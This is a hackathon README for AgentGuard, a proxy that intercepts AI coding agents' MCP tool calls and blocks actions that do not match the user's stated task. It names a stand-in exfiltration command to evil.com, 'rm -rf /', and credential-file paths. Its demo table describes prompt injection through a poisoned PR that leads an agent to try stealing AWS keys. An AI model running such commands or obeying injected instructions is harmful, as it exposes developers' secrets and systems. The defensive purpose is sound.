# AgentGuard — Autonomous AI Security & MCP Intent Proxy
### Cybersecurity & Web3 Track

> **Traditional security asks:** *"Is this action technically allowed?"*  
> **AgentGuard asks:** *"Is this action consistent with what the user originally intended?"*

[![Backend Tests](https://img.shields.io/badge/pytest-69%20passed-brightgreen)](#testing)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.111.0-009688.svg)](https://fastapi.tiangolo.com)
[![React](https://img.shields.io/badge/React-18.3-61DAFB.svg)](https://react.dev)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.2-blue.svg)](https://www.typescriptlang.org/)
[![Model Context Protocol](https://img.shields.io/badge/MCP-JSON--RPC%202.0-blueviolet.svg)](https://modelcontextprotocol.io)
[![Web3 SHA-256 Ledger](https://img.shields.io/badge/Web3-Merkle%20Proof--of--Action-purple.svg)](#4-web3-cryptographic-proof-of-action-ledger)
[![Vercel Deployment](https://img.shields.io/badge/Vercel-Live%20Website-000000?style=for-the-badge&logo=vercel&logoColor=white)](https://agentguard-one-ruddy.vercel.app)

**Live Production Website:** [https://agentguard-one-ruddy.vercel.app](https://agentguard-one-ruddy.vercel.app)  
**GitHub Repository:** [https://github.com/kshitij2901/agentguard](https://github.com/kshitij2901/agentguard)

---

## 1. Executive Summary & Problem Statement

Autonomous AI coding agents (Claude Code, Cursor, Cline, Aider) operate with the developer's elevated local credentials and toolsets. When an agent encounters untrusted inputs—such as a malicious comment in a cloned pull request, an injected prompt in a README, or an unvetted package—the agent can be weaponized against the developer's machine:

1. **Secret Theft**: Reading `~/.aws/credentials`, `~/.ssh/id_rsa`, or production `.env` files.
2. **Data Exfiltration**: Piping code or tokens to external endpoints (`curl -X POST evil.com/exfil?data=...`).
3. **Supply-Chain Attacks (Slopsquatting)**: Installing hallucinated or typosquatted packages (`pip install reqeusts`) containing malicious install hooks.
4. **Scope Creep & Catastrophic Blast Radius**: A simple "cleanup" task escalating into recursive deletion (`rm -rf /`).

Standard OS permissions fail because the agent runs with legitimate user rights. **AgentGuard solves this through Intent-Bound Authorization and MCP Runtime Interception.**

---

## 2. Architecture: The MCP Security Reverse Proxy

AgentGuard implements the industry-standard **Model Context Protocol (MCP)** specification over JSON-RPC 2.0. It acts as an active security gateway between the AI agent and the host operating system:

```text
       [ User Prompt / Task Intent ]
                     │
                     ▼
          [ Autonomous AI Agent ] 
     (Claude Code / Cursor / Cline)
                     │
                     │ (Proposes MCP Tool: read_file, execute_command, write_file)
                     ▼
┌────────────────────────────────────────────────────────┐
│            AgentGuard MCP Security Proxy               │
│                                                        │
│  1. Action Interceptor     (Translates tool call)      │
│  2. Rule Engine (AST)      (Deterministic 0ms check)   │
│  3. Intent Engine          (Vector Cosine Similarity)  │
│  4. Blast-Radius Analyzer  (Scope breach & impact)     │
│  5. Risk Engine            (Composite 0-100 score)     │
│  6. Policy Engine          (Threshold decisions)       │
│  7. Web3 Audit Ledger      (SHA-256 Merkle chain)      │
└────────────────────────────────────────────────────────┘
                     │
                     ▼
   Decision: ALLOW | SANDBOX | APPROVAL_REQUIRED | BLOCK
```

---

## 3. The 3-Tier Multi-Tier Intent Verification Pipeline

Judges frequently ask: *"What if an LLM intent checker is slow, expensive, or hallucinates too?"*  
AgentGuard answers with a **three-tier verification pipeline**:

- **Tier 1 (Deterministic AST & Pattern Rules — 0ms latency)**:
  - Scans for sensitive files (`~/.aws`, `~/.ssh`, `/etc/passwd`), destructive commands (`rm -rf`, `chmod 777`), and typosquatted dependencies (`reqeusts`, `coloramaa`).
  - Harmless actions (`cat src/auth/login.py`) pass immediately with zero overhead.
- **Tier 2 (Vector Space Cosine Similarity — Semantic Intent Alignment)**:
  - Vectorizes the task scope ($T_{\text{goal}} + \text{Allowed Paths}$) and the proposed action target & description.
  - Computes continuous mathematical cosine similarity:
    $$\text{CosineSimilarity}(\vec{V}_{\text{intent}}, \vec{V}_{\text{action}}) = \frac{\vec{V}_{\text{intent}} \cdot \vec{V}_{\text{action}}}{\|\vec{V}_{\text{intent}}\| \|\vec{V}_{\text{action}}\|}$$
- **Tier 3 (Consequence Simulation & Blast Radius Analyzer)**:
  - Analyzes scope breaches, file destruction potential, external network egress, and supply-chain risk.

---

## 4. Web3 Cryptographic Proof-of-Action Ledger

Built specifically for the **Cybersecurity & Web3** track:

- **Immutable Hash Chain**: Every action evaluated produces a block linked cryptographically to the prior entry:
  $$\text{Block}_{i} = \text{SHA256}(\text{PrevHash} \,\|\, i \,\|\, \text{TaskID} \,\|\, \text{Action} \,\|\, \text{Decision} \,\|\, \text{RiskScore} \,\|\, \text{Timestamp})$$
- **Merkle Root Validation**: Rapid mathematical proof of audit integrity (`GET /api/audit/verify-chain`).
- **Simulated EVM Commit Anchor**: Simulates public testnet commits (Polygon Amoy / Arbitrum Sepolia) for non-repudiation.
- **Non-Repudiation Guarantee**: If an autonomous agent causes financial or data loss, this ledger provides undeniable cryptographic evidence of whether the agent breached signed user intent.

---

## 5. Live Hackathon Demo Scenarios

AgentGuard includes 5 one-click demonstration scenarios on the dashboard:

| # | Demo Scenario | User Task Intent | Agent Proposed Behavior | AgentGuard Decision |
| :-: | :--- | :--- | :--- | :--- |
| **1** | **Safe Coding** | *Fix authentication bug* | Reads `src/auth/login.py`, writes fix, runs `pytest` | **`ALLOW`** (Risk: 12/100, Intent: 95%) |
| **2** | **Credential Theft** | *Fix authentication bug* | Agent attempts reading `~/.aws/credentials` | **`BLOCK`** (Risk: 99/100, Intent: 2%) |
| **3** | **Repo Poisoning (PR Diff)** | *Review PR #42 & test* | Poisoned instruction triggers exfiltration of AWS keys | **`BLOCK`** (Risk: 100/100, Exfil blocked) |
| **4** | **Slopsquatting (Supply Chain)** | *Install HTTP client* | Agent hallucinates `pip install reqeusts` | **`BLOCK`** (Supply-Chain Typosquat flagged) |
| **5** | **Scope Creep (Blast Radius)** | *Clean temporary files* | Escalates to catastrophic `rm -rf /` at root | **`BLOCK`** (Blast-Radius containment breach) |

---

## 6. Quickstart Guide

### Option A: Run Backend API & MCP Server
```bash
cd backend
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

# Run FastAPI server
uvicorn app.main:app --reload --port 8000

# Run MCP Security Proxy as stdio server for Claude / Cursor
python -m app.mcp.server --task-goal "Fix auth bug" --allowed-paths "src/auth,tests"
```

### Option B: Run Interactive React Dashboard
```bash
cd frontend
npm install
npm run dev
# Dashboard launches at http://localhost:5173
```

### Option C: Run Full Automated Verification Suite
```bash
cd backend
pytest -v                # 69 unit tests passing
python verify_demos.py   # Verifies all 5 demo scenarios, Web3 chain & MCP gateway
```

---

## 7. Connecting to Claude Desktop / Cursor

Add AgentGuard as a standard MCP server in `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "agentguard": {
      "command": "python3",
      "args": [
        "-m",
        "app.mcp.server",
        "--task-goal",
        "Fix authentication bug in login handler",
        "--allowed-paths",
        "src/auth,tests/auth"
      ]
    }
  }
}
```

All tool calls (`read_file`, `write_file`, `execute_command`) made by Claude are transparently intercepted and verified before reaching your computer.
